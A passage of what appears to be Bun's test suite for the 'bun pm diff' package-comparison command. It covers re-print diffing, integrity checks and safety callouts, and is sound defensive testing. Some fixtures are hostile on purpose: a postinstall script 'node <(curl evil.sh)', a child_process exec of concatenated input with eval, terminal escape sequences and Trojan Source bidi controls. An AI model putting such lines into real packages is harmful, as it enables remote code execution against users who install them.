    expect(nover.stderr).toMatch(/tags: .*latest: 2\.0\.0/);
    // An unknown dist-tag is looked up only in `dist-tags`; it never falls back to `latest`.
    const notag = await diff(["diffme@nosuchtag", "2.0.0", "--name-only"]);
    expect(notag.stdout).toBe("");
    expect(notag.stderr).toContain("no version of diffme matches nosuchtag");
    expect(notag.exitCode).toBe(1);
    const many = await diff(["diffme@1", "diffme@2", "diffme@3"]);
    expect(many.stderr).toContain("no file in either side matches diffme@3");
    expect(many.exitCode).toBe(1);
  });
});

// The terminal view re-prints JS/CSS/JSON through Bun's parser and printer before diffing, so only changes in
// meaning survive. These run folder-against-folder; no registry involved.
describe.concurrent("bun pm diff (canonical re-print)", () => {
  async function pretty(files: Record<string, string | Record<string, string>>, args: string[] = []) {
    using dir = tempDir("pm-diff-ast", files);
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "./a", "./b", ...args],
      cwd: String(dir),
      env: { ...bunEnv, NO_COLOR: undefined, FORCE_COLOR: "1", COLUMNS: "120" },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [raw, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    return { text: raw.replace(/\x1b\[[0-9;]*[mK]/g, ""), stderr, exitCode };
  }
  const changedLines = (text: string) => text.split("\n").filter(l => /^ +[\d:]+ │[-+] /.test(l));

  test("a reformat-only release collapses to 'formatting only'", async () => {
    const { text, exitCode } = await pretty({
      "a/package.json": `{"name":"x","version":"1.0.0"}`,
      "b/package.json": `{\n  "name": "x",\n  "version": "1.0.0"\n}\n`,
      "a/index.js": `'use strict';\nmodule.exports = function add(a, b) { return a + b; };\n`,
      "b/index.js": `"use strict"\n\nmodule.exports = function add(a, b) {\n\treturn a + b\n}\n`,
      "a/style.css": `.a{color:red;margin:0 auto}`,
      "b/style.css": `.a {\n  color: red;\n  margin: 0 auto;\n}\n`,
    });
    expect(text).toMatch(/\nindex\.js ─+ formatting only\n/);
    expect(text).toMatch(/\npackage\.json ─+ formatting only\n/);
    expect(text).toMatch(/\nstyle\.css ─+ formatting only\n/);
    expect(text).toContain("3 formatting only");
    expect(changedLines(text)).toEqual([]);
    expect(exitCode).toBe(0);
  });

  test("two minified builds with different mangled names diff down to the real change", async () => {
    // Same program, names handed out differently by the "minifier", plus one genuine edit (* 2 → * 3) and one
    // inserted helper in b. Long enough on one line to count as minified.
    const body = (n: Record<string, string>, mul: string, extra = "") =>
      `!function(){${extra}function ${n.add}(${n.x},${n.y}){return ${n.x}+${n.y}}function ${n.inc}(${n.x}){return ${n.add}(${n.x},1)*${mul}}` +
      `function ${n.pad1}(${n.x}){return String(${n.x}).padStart(8," ")}function ${n.pad2}(${n.x}){return String(${n.x}).padEnd(8," ")}` +
      `function ${n.clamp}(${n.x},${n.y},${n.z}){return ${n.x}<${n.y}?${n.y}:${n.x}>${n.z}?${n.z}:${n.x}}` +
      `function ${n.sum}(${n.x}){for(var ${n.y}=0,${n.z}=0;${n.z}<${n.x}.length;${n.z}++)${n.y}+=${n.x}[${n.z}];return ${n.y}}` +
      `module.exports={add:${n.add},inc:${n.inc},padStart:${n.pad1},padEnd:${n.pad2},clamp:${n.clamp},sum:${n.sum}}}();\n`;
    const v1 = body({ add: "a", inc: "b", pad1: "c", pad2: "d", clamp: "e", sum: "f", x: "n", y: "t", z: "r" }, "2");
    const v2 = body(
      { add: "t", inc: "n", pad1: "r", pad2: "e", clamp: "u", sum: "o", x: "a", y: "b", z: "c" },
      "3",
      `function i(a){return a==null}`,
    );
    expect(v1.length).toBeGreaterThan(256);
    const { text, exitCode } = await pretty({ "a/dist/x.min.js": v1, "b/dist/x.min.js": v2 });
    expect(text).toMatch(/\ndist\/x\.min\.js ─+ unminified \+3 -1\n/);
    // Two minifiers' spellings of the same thing (`!0`/`true`, `void 0`/`undefined`) fold in this view too.
    const spelled = await pretty({
      "a/dist/x.min.js": v1.replace('padEnd(8," ")', "padEnd(8,true)"),
      "b/dist/x.min.js": v1.replace('padEnd(8," ")', "padEnd(8,!0)").replace("(n,1)*2", "(n,void 0)*2"),
    });
    // `true`/`!0` folds; `1` → `void 0` is a real change and shows — in the readable spelling, not the key's.
    expect(spelled.text).not.toMatch(/│[-+].*(true|!0)/);
    expect(spelled.text).toContain("│+     return a(a1, void 0) * 2;");
    expect(spelled.text).toMatch(/\ndist\/x\.min\.js ─+ 1 folded unminified \+1 -1\n/);
    // The banner comment is not in the print, so it is shown and compared as written.
    const bannered = await pretty({
      "a/dist/x.min.js": "/*! x v1 | MIT */\n" + v1,
      "b/dist/x.min.js": "/*! x v2 | MIT */\n" + v1,
    });
    expect(bannered.text).toMatch(
      /\ndist\/x\.min\.js ─+ unminified \+1 -1\n +1:1 │- \/\*! x v1 \| MIT \*\/\n +1:1 │\+ \/\*! x v2 \| MIT \*\/\n/,
    );
    // A brand-new minified bundle is shown un-minified too, not as one enormous `+` line.
    const added = await pretty({ "a/README.md": "x\n", "b/README.md": "x\n", "b/dist/x.min.js": v2 });
    expect(added.text).toMatch(/\ndist\/x\.min\.js ─+ unminified new \+\d\d\n/);
    expect(added.text).toContain("│+   function ");
    // Un-minified lines are numbered by their original `line:col`.
    expect(text).toMatch(/\n +1:\d+ │\+   function a\(a1\) \{\n/);
    const changed = changedLines(text).map(l => l.replace(/^ +[\d:]+ │/, ""));
    expect(changed.filter(l => l.startsWith("-"))).toEqual(["-     return b(a1, 1) * 2;"]);
    expect(changed.filter(l => l.startsWith("+"))).toEqual([
      "+   function a(a1) {",
      "+     return a1 == null;",
      "+     return b(a1, 1) * 3;",
    ]);
    // --raw turns all of that off: one giant line each way.
    expect(exitCode).toBe(0);
    const raw = await pretty({ "a/dist/x.min.js": v1, "b/dist/x.min.js": v2 }, ["--raw"]);
    expect(raw.text).toMatch(/\ndist\/x\.min\.js ─+ \+1 -1\n/);
    expect(raw.exitCode).toBe(0);
  });

  test("--minify folds equivalent syntax; --unminify renames locals in lockstep even in readable files; -w", async () => {
    const files = {
      // Same program, different spellings: only --minify sees through it.
      "a/flags.js": `module.exports = { on: !0, off: !1, none: void 0, s: 'x' + 'y' };\n`,
      "b/flags.js": `module.exports = { on: true, off: false, none: undefined, s: "xy" };\n`,
      // Same program, locals renamed by hand: only --unminify (or a minified-looking file) collapses it.
      "a/sum.js": `module.exports = function sum(xs) {\n  let t = 0;\n  for (const x of xs) t += x;\n  return t;\n};\n`,
      "b/sum.js": `module.exports = function sum(a) {\n  let n = 0;\n  for (const v of a) n += v;\n  return n;\n};\n`,
      "a/notes.txt": `one two\nthree\n`,
      "b/notes.txt": `one  two\n\tthree \n\n`,
    };
    const plain = await pretty(files);
    // Equivalent spellings fold away by default now; only the renamed locals and the whitespace file remain.
    expect(plain.text).toMatch(/\nflags\.js ─+ formatting only\n/);
    // A consistent rename of locals is not a change either: the key names every local by structure.
    expect(plain.text).toMatch(/\nsum\.js ─+ formatting only\n/);
    expect(plain.text).toMatch(/\nnotes\.txt ─+ \+3 -2\n/);
    const folded = await pretty(files, ["--minify", "--unminify", "-w"]);
    expect(folded.text).toMatch(/\nflags\.js ─+ formatting only\n/);
    expect(folded.text).toMatch(/\nsum\.js ─+ formatting only\n/);
    expect(folded.text).toMatch(/\nnotes\.txt ─+ whitespace only\n/);
    expect(folded.text).toContain("2 formatting only  ·  1 whitespace only");
    expect(changedLines(folded.text)).toEqual([]);
    expect(folded.exitCode).toBe(0);
    // --unformatted is --raw.
    const raw = await pretty(files, ["--unformatted"]);
    expect(raw.text).toMatch(/\nflags\.js ─+ \+1 -1\n/);
    // Piped, -w still yields a complete patch for the whitespace-only file.
    using dir = tempDir("pm-diff-w", files);
    const piped = await diff(["./a", "./b", "-w"], String(dir));
    expect(piped.stdout).toContain(
      "--- a/notes.txt\n+++ b/notes.txt\n@@ -1,2 +1,3 @@\n-one two\n-three\n+one  two\n+\tthree \n+\n",
    );
    expect(piped.exitCode).toBe(0);
  });

  test("CRLF files: the terminal view diffs them as LF, and a pure line-ending flip collapses", async () => {
    const { text, stderr, exitCode } = await pretty({
      "a/notes.txt": "same line\r\nold value here\r\n",
      "b/notes.txt": "same line\nnew value here\n",
      "a/eol.txt": "one\r\ntwo\r\n",
      "b/eol.txt": "one\ntwo\n",
      // A stray CR at end of file (no newline after it) on one side only.
      "a/bare.txt": "same\nfoo\r",
      "b/bare.txt": "same\nbar",
    });
    expect(stderr).toBe("");
    expect(text).toContain("    1 │  same line\n    2 │- old value here\n    2 │+ new value here\n");
    expect(text).toMatch(/\neol\.txt ─+ line endings only\n/);
    expect(text).toContain("    1 │  same\n    2 │- foo\n    2 │+ bar\n");
    expect(text).not.toContain("\r");
    expect(exitCode).toBe(0);
  });

  test("package.json text in the summary is shown literally, angle brackets and all", async () => {
    const { text } = await pretty({
      "a/package.json": JSON.stringify({ name: "x", version: "1.0.0", dependencies: { y: "^1.0.0" } }),
      "b/package.json": JSON.stringify({
        name: "x",
        version: "1.0.1",
        dependencies: { y: ">=1.3.0 <2" },
        scripts: { postinstall: "node <(curl evil.sh)" },
      }),
    });
    expect(text).toContain("▲ postinstall script added: node <(curl evil.sh)\n");
    expect(text).toContain("▲ dependencies y: ^1.0.0 → >=1.3.0 <2\n");
  });

  test("summary calls out new builtin imports, risky APIs, and skips source maps", async () => {
    const { text, exitCode } = await pretty({
      "a/index.js": `const path = require("path");\nmodule.exports = p => path.basename(p);\n`,
      "b/index.js":
        `const path = require("path");\nconst cp = require("child_process");\nconst leftPad = require("left-pad");\n` +
        `module.exports = p => { cp.exec("echo " + p); return eval(leftPad(path.basename(p))); };\n`,
      "a/index.js.map": `{"version":3,"mappings":"AAAA"}`,
      "b/index.js.map": `{"version":3,"mappings":"AACA;AAAA"}`,
    });
    expect(text).toContain("▲ now imports child_process (index.js)\n");
    expect(text).toContain("▲ new module imports: left-pad\n");
    expect(text).toContain("▲ +1 eval() (index.js)\n");
    expect(text).toMatch(/\nindex\.js\.map ─+ source map 31 → 36 bytes\n/);
    expect(exitCode).toBe(0);
  });
});

describe.concurrent("bun pm diff (hostile and awkward inputs)", () => {
  async function pretty(files: Record<string, any>, args: string[] = [], env: Record<string, string> = {}) {
    using dir = tempDir("pm-diff-hx", files);
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "./a", "./b", ...args],
      cwd: String(dir),
      env: { ...bunEnv, NO_COLOR: undefined, FORCE_COLOR: "1", COLUMNS: "120", ...env },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [raw, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    return { raw, text: raw.replace(/\x1b\[[0-9;]*[mK]/g, ""), stderr, exitCode, dir: String(dir) };
  }
  const ESC = "\x1b";
  const CSI_C1 = "\u009b";
  const RLO = "\u202e";
  const LRI = "\u2066";
  const PDI = "\u2069";

  test("a tarball is requested and verified the way bun install does it", async () => {
    const versions = ["1.0.0", "2.0.0"];
    const balls = async (body: string) =>
      Object.fromEntries(
        await Promise.all(
          versions.map(async version => {
            const manifest = JSON.stringify({ name: "p", version });
            const files = { "package/package.json": manifest, "package/index.js": `${body} ${version}\n` };
            return [version, await new Bun.Archive(files).bytes("gzip")] as const;
          }),
        ),
      );
    const [published, other] = [await balls("published"), await balls("other")];
    let [listed, served] = [published, published];
    const asked: Record<string, string>[] = [];
    using server = Bun.serve({
      port: 0,
      fetch(req) {
        const version = new URL(req.url).pathname.match(/p-(.+)\.tgz$/)?.[1];
        if (version) {
          asked.push(req.headers.toJSON());
          return new Response(served[version]);
        }
        const entry = (version: string) => ({
          name: "p",
          version,
          dist: {
            tarball: `${server.url.origin}/p/-/p-${version}.tgz`,
            integrity: "sha512-" + new Bun.CryptoHasher("sha512").update(listed[version]).digest("base64"),
          },
        });
        return Response.json({
          name: "p",
          "dist-tags": { latest: "2.0.0" },
          versions: Object.fromEntries(versions.map(version => [version, entry(version)])),
        });
      },
    });
    using dir = tempDir("pm-diff-checked", {
      "package.json": JSON.stringify({ name: "app", dependencies: { p: "1.0.0" } }),
    });
    const run = async (...cmd: string[]) => {
      await using p = Bun.spawn({
        cmd: [bunExe(), ...cmd],
        cwd: String(dir),
        env: {
          ...bunEnv,
          NPM_CONFIG_REGISTRY: server.url.origin,
          BUN_CONFIG_REGISTRY: server.url.origin,
          BUN_INSTALL_CACHE_DIR: join(String(dir), ".cache"),
          NO_COLOR: "1",
        },
        stdout: "pipe",
        stderr: "pipe",
      });
      const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
      return { stdout, stderr, exitCode };
    };

    expect(await run("install")).toMatchObject({ exitCode: 0 });
    const [byInstall] = asked.splice(0);
    expect(await run("pm", "diff", "p")).toMatchObject({
      stdout: expect.stringContaining("+published 2.0.0"),
      stderr: "",
      exitCode: 0,
    });
    expect(asked).toEqual([byInstall, byInstall]);

    // not the bytes the registry lists
    served = other;
    expect(await run("pm", "diff", "p@1.0.0", "2.0.0")).toEqual({
      stdout: "",
      stderr: expect.stringMatching(/^error: Integrity check failed for tarball: p@[12]\.0\.0\n$/),
      exitCode: 1,
    });

    // not the bytes bun.lock has
    listed = other;
    expect(await run("pm", "diff", "p@1.0.0", "2.0.0")).toMatchObject({ stderr: "", exitCode: 0 });
    expect(await run("pm", "diff", "p")).toEqual({
      stdout: "",
      stderr: "error: Integrity check failed for tarball: p@1.0.0\n",
      exitCode: 1,
    });
  });

  test("package bytes never drive the terminal: ESC/CR/C1 and bidi controls are drawn, and called out", async () => {
    const evil = `exports.ok = true;\nexports.motd = "${ESC}[2K${ESC}[1A hidden \r";\nconst s = "${CSI_C1}31m"; // C1 CSI\n`;
    const trojan = `const isAdmin = false; /*${RLO} } ${LRI}if (isAdmin)${PDI} ${LRI} begin admins only */\n`;
    const { raw, text, exitCode } = await pretty({
      "a/index.js": "exports.ok = true;\n",
      "b/index.js": evil,
      "a/auth.js": "const isAdmin = false;\n",
      "b/auth.js": trojan,
    });
    // The only ESC bytes in the output are our own colour / erase-to-EOL codes.
    expect(raw.replace(/\x1b\[[0-9;]*[mK]/g, "")).not.toContain(ESC);
    expect(raw).not.toContain(CSI_C1);
    expect(raw).not.toContain(RLO);
    expect(text).toContain('exports.motd = "␛[2K␛[1A hidden ^M";');
    expect(text).toContain("‹U+009B›31m");
    expect(text).toContain("‹U+202E›");
    expect(text).toContain("▲ terminal escape sequences in index.js (shown as ␛)\n");
    expect(text).toContain("▲ bidirectional text controls in auth.js (Trojan Source; shown as ‹U+202E›)\n");
    expect(exitCode).toBe(0);
  });

  // ConPTY rewrites the process's output.
  test.skipIf(isWindows)("NO_COLOR on a terminal: the plain patch, with control characters drawn", async () => {
    const added = `exports.b = 2; //${ESC}[2K${ESC}[1A ${CSI_C1}31m ${RLO}\x7f\b `;
    using dir = tempDir("pm-diff-plain-tty", {
      "a/index.js": "exports.a = 1;\n",
      "b/index.js": `exports.a = 1;\n${added}\n`,
      [`b/${RLO}name${CSI_C1}.js`]: "exports.c = 3;\n",
    });
    const decoder = new TextDecoder();
    let terminal = "";
    const closed = Promise.withResolvers<void>();
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "./a", "./b"],
      cwd: String(dir),
      env: { ...bunEnv, NO_COLOR: "1", FORCE_COLOR: undefined },
      terminal: {
        cols: 120,
        rows: 50,
        data(_, chunk) {
          terminal += decoder.decode(chunk, { stream: true });
        },
        // The terminal is closed once the process has exited and the rest of its output was delivered.
        exit() {
          closed.resolve();
        },
      },
    });
    const [exitCode] = await Promise.all([p.exited, closed.promise]);
    expect(terminal.replaceAll("\r\n", "\n")).toContain(
      "--- a/index.js\n+++ b/index.js\n@@ -1,1 +1,2 @@\n exports.a = 1;\n+exports.b = 2; //␛[2K␛[1A ‹U+009B›31m ‹U+202E›^?^H‹U+2028›\n",
    );
    expect(terminal).toContain("+++ b/‹U+202E›name‹U+009B›.js");
    for (const raw of [ESC, CSI_C1, RLO, "\x7f", "\b", " "]) expect(terminal).not.toContain(raw);
    expect(exitCode).toBe(0);

    // Into a pipe the same patch has the bytes of the files.
    const piped = await diff(["./a", "./b"], String(dir));
    expect(piped.stdout).toContain(` exports.a = 1;\n+${added}\n`);
    expect(piped.stdout).toContain(`+++ b/${RLO}name${CSI_C1}.js\n`);
  });

  test("a NUL byte doesn't turn a file that's read as text into a binary file", async () => {
    const line = "exports.a = 1;\n";
    const more = `exports.b = require("child_process");\n`;
    const text: Record<string, [string, string]> = {
      "first.js": [line, "/* \0 */\n" + line + more],
      "both.js": ["// \0\n" + line, "// \0\n" + line + more],
      "types.d.ts": ["// \0\n", "// \0\nexport {};\n"],
      "data.json": [`{ "a": "\0" }\n`, `{ "a": "\0", "b": 1 }\n`],
      "setup.sh": ["# \0\n", "# \0\necho more\n"],
      "bin/run": ["#!/bin/sh\n# \0\n", "#!/bin/sh\n# \0\necho more\n"],
      // JavaScript, whatever the name says.
      "data.bin": ["/* \0 */ " + line, "/* \0 */ " + line + more],
      "notes.map": [`{"version";${line.trim()}}\n`, `{"version";${line.trim()}${more.trim()}}\n`],
    };
    const binary: Record<string, [string, string]> = {
      "real.bin": ["\0\x01one", "\0\x01three"],
      "real.wasm": ["\0asm1", "\0asm2"],
      "turned.dat": ["one\n", "\0\x01"],
    };
    const sides = Object.entries({ ...text, ...binary }).flatMap(([path, [a, b]]) => [
      ["a/" + path, a],
      ["b/" + path, b],
    ]);
    using dir = tempDir("pm-diff-nul", Object.fromEntries(sides));
    const sha = (bytes: string) => new Bun.CryptoHasher("sha256").update(bytes).digest("hex");

    const json = JSON.parse((await diff(["./a", "./b", "--json"], String(dir))).stdout);
    const last = (patch: string) => patch.trimEnd().split("\n").at(-1);
    expect(Object.fromEntries(json.files.map((f: any) => [f.path, f.binary || f.sourceMap || last(f.patch)]))).toEqual({
      "first.js": "+" + more.trim(),
      "both.js": "+" + more.trim(),
      "types.d.ts": "+export {};",
      "data.json": `+{ "a": "\0", "b": 1 }`,
      "setup.sh": "+echo more",
      "bin/run": "+echo more",
      "data.bin": "+" + more.trim(),
      "notes.map": `+{"version";${line.trim()}${more.trim()}}`,
      "real.bin": true,
      "real.wasm": true,
      "turned.dat": true,
    });
    expect(json.files.find((f: any) => f.path === "real.bin")).toMatchObject({
      sha256Before: sha(binary["real.bin"][0]),
      sha256After: sha(binary["real.bin"][1]),
    });
    expect(json.notes).toEqual(["now imports child_process (both.js)", "turned.dat was text and is now binary"]);

    const piped = await diff(["./a", "./b"], String(dir));
    expect(piped.stdout).toContain(`@@ -1,1 +1,3 @@\n+/* \0 */\n ${line}+${more}`);
    expect(piped.stdout).toContain(
      `Binary files differ (5 → 7 bytes, sha256 ${sha("\0\x01one").slice(0, 12)} → ${sha("\0\x01three").slice(0, 12)})\n`,
    );

    const shown = await pretty(Object.fromEntries(sides));
    expect(shown.text).toContain("/* ^@ */\n");
    expect(shown.text).toContain(more);
    expect(shown.raw).not.toContain("\0");
    expect(shown.text).toMatch(
      new RegExp(`\nreal\\.bin ─+ binary 5 → 7 bytes, sha256 ${sha("\0\x01one").slice(0, 12)} → [0-9a-f]{12}\n`),
    );
    expect(shown.exitCode).toBe(0);
  });

  test("the summary of a published version comes from the registry's metadata", async () => {
    // What version 2.0.0 adds, as [to the package.json in its tarball, to its entry in the registry's document].
    const cases: Record<string, [object, object]> = {
      "same": [{ dependencies: { dep: "1.0.0" } }, { dependencies: { dep: "1.0.0" } }],
      // A registry writes some fields its own way.
      "respelled": [
        {
          bin: "./cli.js",
          dependencies: {},
          optionalDependencies: { opt: "1.0.0" },
          peerDependencies: {},
          os: "linux",
          libc: ["glibc"],
        },
        {
          bin: { respelled: "cli.js" },
          dependencies: { opt: "1.0.0" },
          optionalDependencies: { opt: "1.0.0" },
          os: ["linux"],
        },
      ],
      "dependency": [{}, { dependencies: { extra: "1.0.0" } }],
      "optional": [{}, { optionalDependencies: { extra: "1.0.0" } }],
      "peer": [{}, { peerDependencies: { extra: "1.0.0" } }],
      "command": [{}, { bin: { tool: "./cli.js" } }],
      "folder": [{}, { directories: { bin: "./scripts" } }],
      "absent": [{ dependencies: { dep: "1.0.0" } }, {}],
      "unlisted": [{ bin: { tool: "./cli.js" } }, {}],
    };
    const added = (name: string, version: string, where: 0 | 1) => (version === "2.0.0" ? cases[name][where] : {});
    using server = Bun.serve({
      port: 0,
      async fetch(req) {
        const path = new URL(req.url).pathname;
        const [, name, version] = path.match(/^\/([a-z]+)\/-\/[a-z]+-(.+)\.tgz$/) ?? [, path.slice(1)];
        if (!cases[name!]) return new Response("Not Found", { status: 404 });
        if (version) {
          const manifest = JSON.stringify({ name, version, ...added(name!, version, 0) });
          return new Response(
            await new Bun.Archive({ "package/package.json": manifest, "package/cli.js": "" }).bytes("gzip"),
          );
        }
        const versions = ["1.0.0", "2.0.0"].map(version => [
          version,
          {
            name,
            version,
            ...added(name!, version, 1),
            dist: { tarball: `${server.url.origin}/${name}/-/${name}-${version}.tgz` },
          },
        ]);
        return Response.json({ name, "dist-tags": { latest: "2.0.0" }, versions: Object.fromEntries(versions) });
      },
    });
    using dir = tempDir("pm-diff-entry", { "package.json": JSON.stringify({ name: "app" }) });
    const notes: Record<string, string[]> = {};
    for (const name of Object.keys(cases)) {
      await using p = Bun.spawn({
        cmd: [bunExe(), "pm", "diff", `${name}@1.0.0`, "2.0.0", "--json"],
        cwd: String(dir),
        env: { ...bunEnv, NPM_CONFIG_REGISTRY: server.url.origin, BUN_CONFIG_REGISTRY: server.url.origin },
        stdout: "pipe",
        stderr: "pipe",
      });
      const [stdout, stderr] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
      expect(stderr).toBe("");
      notes[name] = JSON.parse(stdout).notes;
    }
    const disagree = (name: string, field: string, registry: string, file: string) =>
      `registry and package.json of ${name}@2.0.0 disagree on ${field}: ${registry} vs ${file} (bun install uses the registry's)`;
    expect(notes.respelled.filter(note => note.includes("disagree"))).toEqual([]);
    delete notes.respelled;
    expect(notes).toEqual({
      "same": ["dependencies added: dep@1.0.0"],
      "dependency": [
        disagree("dependency", "dependencies", '{ "extra": "1.0.0" }', "nothing"),
        "dependencies added: extra@1.0.0",
      ],
      "optional": [
        disagree("optional", "optionalDependencies", '{ "extra": "1.0.0" }', "nothing"),
        "optionalDependencies added: extra@1.0.0",
      ],
      "peer": [
        disagree("peer", "peerDependencies", '{ "extra": "1.0.0" }', "nothing"),
        "peerDependencies added: extra@1.0.0",
      ],
      "command": [disagree("command", "bin", '{ "tool": "./cli.js" }', "nothing"), 'bin added: { "tool": "./cli.js" }'],
      "folder": [
        disagree("folder", "directories", '{ "bin": "./scripts" }', "nothing"),
        'directories added: { "bin": "./scripts" }',
      ],
      "absent": [disagree("absent", "dependencies", "nothing", '{ "dep": "1.0.0" }')],
      // Other tools read the file.
      "unlisted": [
        disagree("unlisted", "bin", "nothing", '{ "tool": "./cli.js" }'),
        'bin added: { "tool": "./cli.js" }',
      ],
    });
  });

  test("package.json callouts compare whole values, however long", async () => {
    const notes = async (a: object | string, b: object | string) => {
      const manifest = (more: object | string) =>
        typeof more === "string" ? more : JSON.stringify({ name: "p", version: "1.0.0", ...more });
      const { raw } = await pretty({ "a/package.json": manifest(a), "b/package.json": manifest(b) }, ["--json"]);
      return JSON.parse(raw).notes as string[];
    };
    const entry = (name: string, required = `./dist/${name}.cjs`) => ({
      types: `./dist/${name}.d.ts`,
      import: `./dist/${name}.mjs`,
      require: required,
    });
    const exports = { ".": entry("index"), "./utils": entry("utils") };
    const bin = {
      "p-build-the-documentation": "./bin/build-the-documentation.js",
      "p-check-the-configuration": "./bin/check-the-configuration.js",
    };
    expect(await notes({ exports, bin }, { bin, exports })).toEqual([]);

    const tail = await notes({ exports }, { exports: { ...exports, "./utils": entry("utils", "./other.cjs") } });
    expect(tail).toEqual([
      expect.stringMatching(
        /^exports changed: \.\.\..* "require": "\.\/dist\/utils\.cjs" \} \} → \.\.\..* "require": "\.\/other\.cjs" \} \}$/,
      ),
    ]);
    expect(tail[0].length).toBeLessThan(300);
    expect(await notes({ exports }, { exports: { ...exports, "./more": "./more.cjs" } })).toEqual([
      expect.stringMatching(/^exports changed: .* → .*, "\.\/more": "\.\/more\.cjs" \}$/),
    ]);
    expect(await notes({ bin }, { bin: { ...bin, more: "./more.js" } })).toEqual([
      expect.stringMatching(/^bin changed: .* → .*, "more": "\.\/more\.js" \}$/),
    ]);
    expect(await notes({ exports: { ".": "./a  b.js" } }, { exports: { ".": "./a b.js" } })).toHaveLength(1);
    expect(await notes({ type: "commonjs" }, { type: "module" })).toEqual(["type changed: commonjs → module"]);

    // Many ranges that move are one fact. A range that turns into something else is another.
    const ranges = (range: string) => Object.fromEntries([..."abcdefg"].map(name => [name, range]));
    expect(
      await notes(
        { dependencies: ranges("^1.0.0") },
        { dependencies: { ...ranges("^1.0.1"), f: "https://example.com/f.tgz", g: "npm:other@^1.0.1" } },
      ),
    ).toEqual([
      "dependencies f: ^1.0.0 → https://example.com/f.tgz",
      "dependencies g: ^1.0.0 → npm:other@^1.0.1",
      "dependencies a: ^1.0.0 → ^1.0.1",
      "dependencies b: ^1.0.0 → ^1.0.1",
      "dependencies c: ^1.0.0 → ^1.0.1",
      "… and 2 more dependencies version changes",
    ]);

    expect(
      await notes(
        `{"name":"p","version":"1.0.0","main":"./a.js"}`,
        `{"name":"p","version":"1.0.0","main":"./a.js","main":"./b.js"}`,
      ),
    ).toEqual(["main listed more than once in package.json"]);
  });

  test("a comment-only change is not 'formatting only', and neither is a TypeScript type change", async () => {
    const { text, exitCode } = await pretty({
      // Ordinary comments are not in the re-print, so a change to one must not pass as formatting.
      "a/lib.js": "// lib v1 (MIT)\nmodule.exports = 1; // one\n",
      "b/lib.js": "// lib v2 (MIT)\nmodule.exports = 1; // uno\n",
      // Legal comments are kept by the printer, so they diff like code.
      "a/legal.js": "/*! lib v1 | MIT */\nmodule.exports = 1;\n",
      "b/legal.js": "/*! lib v2 | MIT */\nmodule.exports = 1;\n",
      "a/quotes.js": "module.exports = 'x'; // same\n",
      "b/quotes.js": 'module.exports = "x"; // same\n',
      "a/api.ts": "export function f(x: number): number { return x; }\n",
      "b/api.ts": "export function f(x: string): string { return x; }\n",
    });
    // Shown as the author wrote them: comment edits and type edits are changes, quote style is not.
    expect(text).toMatch(/\nlib\.js ─+ \+2 -2\n/);
    expect(text).toContain("│- // lib v1 (MIT)");
    expect(text).toContain("│- module.exports = 1; // one");
    expect(text).toMatch(/\nlegal\.js ─+ \+1 -1\n/);
    expect(text).toContain("│- /*! lib v1 | MIT */");
    expect(text).not.toContain("~ module.exports = 1;");
    expect(text).toMatch(/\nquotes\.js ─+ formatting only\n/);
    expect(text).toMatch(/\napi\.ts ─+ \+1 -1\n/);
    expect(text).toContain("│+ export function f(x: string): string { return x; }");
    expect(exitCode).toBe(0);
  });

  test("changes are decided on meaning and shown as written: folds hide, control flow shows, dead code is flagged", async () => {
    const before = [
      "// math helpers",
      "const LIMIT = 1 + 1;",
      "export function clamp(x) {",
      "  if (x > LIMIT) return LIMIT; // cap",
      "  return x;",
      "}",
      "export const flags = { on: !0, s: 'a' + 'b' };",
      "if (false) {",
      "  fetch('https://x.test/never');",
      "}",
      "",
    ].join("\n");
    const after = [
      "// math helpers (v2)",
      "const LIMIT = 2;",
      "export function clamp(x) {",
      "  if (x >= LIMIT) return LIMIT; // cap",
      "  return x;",
      "}",
      'export const flags = {on: true, s: "ab"};',
      "if (true) {",
      "  fetch('https://x.test/never');",
      "}",
      "",
    ].join("\n");
    const { text, exitCode } = await pretty({ "a/m.js": before, "b/m.js": after });
    // `1 + 1`/`2`, `!0`/`true`, `'a' + 'b'`/`"ab"` and spacing fold away…
    expect(text).not.toContain("- const LIMIT = 1 + 1;");
    expect(text).not.toContain("+ const LIMIT = 2;");
    expect(text).not.toMatch(/[-+] export const flags/);
    // …the comment edit and the operator change are shown in the author's words…
    expect(text).toContain("│- // math helpers\n");
    expect(text).toContain("│+ // math helpers (v2)\n");
    expect(text).toContain("│-   if (x > LIMIT) return LIMIT; // cap\n");
    expect(text).toContain("│+   if (x >= LIMIT) return LIMIT; // cap\n");
    // …and flipping the constant makes the previously-dead call show up as affected, though its text never changed.
    expect(text).toContain("│- if (false) {\n");
    expect(text).toContain("│+ if (true) {\n");
    expect(text).toContain("│~   fetch('https://x.test/never');\n");
    expect(text).toContain("  const LIMIT = 2;\n");
    expect(text).toContain(
      '│  export const flags = {on: true, s: "ab"};\n    8 │- if (false) {\n    8 │+ if (true) {\n',
    );
    expect(text).toMatch(/\nm\.js ─+ 2 folded \+3 -3\n/);
    expect(exitCode).toBe(0);
  });

  test("how the source wrapped a literal is not remembered: `{a, b}` on one line vs three is the same", async () => {
    const one =
      "module.exports = function m(t, c) {\n  return { $$typeof: 1, type: t, compare: c === void 0 ? null : c };\n};\n";
    const three =
      "module.exports = function m(t, c) {\n  return {\n    $$typeof: 1,\n    type: t,\n    compare: c === void 0 ? null : c\n  };\n};\n";
    // readable: folds in the projected view
    let r = await pretty({ "a/m.js": one, "b/m.js": three });
    expect(r.text).toMatch(/\nm\.js ─+ formatting only\n/);
    // minified: both sides re-print the object the same way in the un-minified view
    const pad = "/*" + Buffer.alloc(300, "x").toString() + "*/";
    const min = "module.exports=function m(t,c){return{$$typeof:1,type:t,compare:c===void 0?null:c}};";
    r = await pretty({ "a/m.min.js": pad + min, "b/m.min.js": pad + min.replace("return{", "return{\n") });
    expect(r.text).toMatch(/\nm\.min\.js ─+ formatting only\n/);
    expect(r.exitCode).toBe(0);
  });

  test("line tints follow the terminal background (COLORFGBG light → light palette; truecolor when offered)", async () => {
    const files = { "a/x.txt": "one\n", "b/x.txt": "two\n" };
    using dir = tempDir("pm-diff-theme", files);
